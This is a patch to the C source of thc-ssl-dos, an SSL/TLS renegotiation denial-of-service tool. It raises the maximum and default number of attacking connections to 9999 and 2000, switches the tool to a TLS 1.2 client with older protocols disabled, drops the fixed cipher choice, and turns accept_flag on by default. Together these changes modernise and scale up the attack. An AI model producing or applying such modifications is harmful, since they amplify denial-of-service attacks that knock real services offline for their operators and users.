@@ -5,8 +5,8 @@
 #include <openssl/err.h>
 
 
-#define MAX_PEERS		(999)
-#define DEFAULT_PEERS		(400)
+#define MAX_PEERS		(9999)
+#define DEFAULT_PEERS		(2000)
 #define PROGRAM_NAME		"thc-ssl-dos"
 #define TO_TCP_CONNECT		(10)	/* 10 second TCP connect() timeout */
 
@@ -131,7 +131,11 @@ init_vars(void)
 {
 	SSL_library_init();
 	SSL_load_error_strings();
-	g_opt.ctx = SSL_CTX_new(SSLv23_method()); 
+//	g_opt.ctx = SSL_CTX_new(SSLv23_method()); 
+        g_opt.ctx = SSL_CTX_new(TLSv1_2_client_method());
+        SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_SSLv2);
+        SSL_CTX_set_options(g_opt.ctx,SSL_OP_NO_SSLv3);
+        SSL_CTX_set_options(g_opt.ctx,SSL_OP_NO_TLSv1);
 
 #ifdef SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
 	SSL_CTX_set_options(g_opt.ctx, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
@@ -143,10 +147,12 @@ init_vars(void)
 	/* RC4-MD5                 SSLv3 Kx=RSA      Au=RSA  Enc=RC4(128) */
 	/* RSA_decrypt() is 15x slower (used for Kx) than RSA_encrypt() */
 	//SSL_CTX_set_cipher_list(g_opt.ctx, "ECDHE-RSA-AES256-SHA");
-	SSL_CTX_set_cipher_list(g_opt.ctx, "AES256-SHA");
+	//SSL_CTX_set_cipher_list(g_opt.ctx, "AES256-SHA");
+//        SSL_CTX_set_cipher_list(g_opt.ctx,"TLS_AES_256_GCM_SHA384");
 	//SSL_CTX_set_cipher_list(g_opt.ctx, "RC4-MD5");
 	//SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1);
 	//SSL_CTX_set_options(ctx, SSL_OP_LEGACY_SERVER_CONNECT);
+        
 
 	int i;
 	for (i = 0; i < MAX_PEERS; i++)
@@ -169,7 +175,7 @@ do_getopt(int argc, char *argv[])
 {
 	int c;
 	int i;
-	static int accept_flag = 0;
+	static int accept_flag = 1;
 	static int skipdelay_flag = 0;
 
 	static struct option long_options[] =
